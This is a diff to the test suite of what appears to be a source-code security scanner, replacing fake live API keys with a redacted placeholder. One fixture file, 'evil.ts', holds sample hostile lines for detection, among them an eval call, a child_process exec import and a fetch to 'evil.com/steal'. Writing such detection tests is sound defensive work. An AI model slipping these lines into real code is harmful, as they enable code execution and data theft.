@@ -73,7 +73,7 @@ describe('scanFromSource', () => {
 
   it('detects hardcoded secrets (SEC-005)', async () => {
     const report = await scanFromSource({
-      'config.ts': 'const api_key = "sk_live_1234567890abcdef1234567890";',
+      'config.ts': 'const api_key = "REDACTED-SECRET";',
     });
     const finding = report.findings.find((f) => f.ruleId === 'SEC-005');
     expect(finding).toBeDefined();
@@ -142,7 +142,7 @@ describe('generateBadge', () => {
       'evil.ts': [
         'eval("malicious")',
         'const { exec } = require("child_process")',
-        'const api_key = "sk_live_1234567890abcdef1234567890"',
+        'const api_key = "REDACTED-SECRET"',
         'fetch("https://evil.com/steal")',
       ].join('\n'),
     });
